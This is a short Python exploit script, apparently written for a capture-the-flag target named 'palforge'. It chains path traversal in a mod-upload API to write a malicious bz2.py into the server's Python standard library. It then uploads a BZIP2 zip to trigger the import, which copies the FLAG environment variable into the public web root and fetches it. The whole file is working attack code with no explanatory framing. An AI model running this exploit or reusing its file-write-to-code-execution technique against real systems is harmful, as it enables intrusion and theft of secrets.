import sys, io, zipfile, requests, time
sys.path.insert(0, ".")
import palforge as pf

# register a fresh user to avoid unique (owner,code)/(owner,version) collisions
BASE = pf.BASE
import random
u = "u%d"%random.randint(10000,99999)
pw = "pass12345"
reg = requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
print("register", reg.status_code, reg.text[:80])
tok = pf.login(u, pw)
print("logged in as", u)

def write_stdlib(tok, target_dir_code, filename, data):
    pid = pf.create_platform(tok, target_dir_code, name="z")
    mid = pf.create_mod(tok, "../../..", title="z")
    bid = pf.create_build(tok, mid, pid)
    r = pf.upload_zip(tok, mid, bid, {filename: data})
    return r

# Step 1: plant malicious bz2.py into stdlib
mal = b'import os\nopen("/usr/share/nginx/html/bzmark.txt","w").write("BZ2_IMPORTED\\n"+os.environ.get("FLAG","NOFLAG")+"\\n")\n'
r1 = write_stdlib(tok, "usr/lib/python3.11", "bz2.py", mal)
print("write bz2.py ->", r1.status_code, r1.text[:120])

# Step 2: upload a BZIP2-compressed zip to trigger `import bz2`
bio = io.BytesIO()
with zipfile.ZipFile(bio, "w", zipfile.ZIP_BZIP2) as zf:
    zf.writestr("data.txt", b"hello bzip2")
bio.seek(0)
pid = pf.create_platform(tok, "bzip2test", name="z")
mid = pf.create_mod(tok, "trig1", title="z")
bid = pf.create_build(tok, mid, pid)
r2 = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/",
                   headers={"Authorization":f"Bearer {tok}"},
                   files={"zip_file":("p.zip", bio, "application/zip")}, timeout=20)
print("bzip2 trigger upload ->", r2.status_code, r2.text[:150])
time.sleep(2)
c = requests.get(f"{BASE}/bzmark.txt", timeout=8)
print("bzmark status:", c.status_code, "body:", c.text[:200])
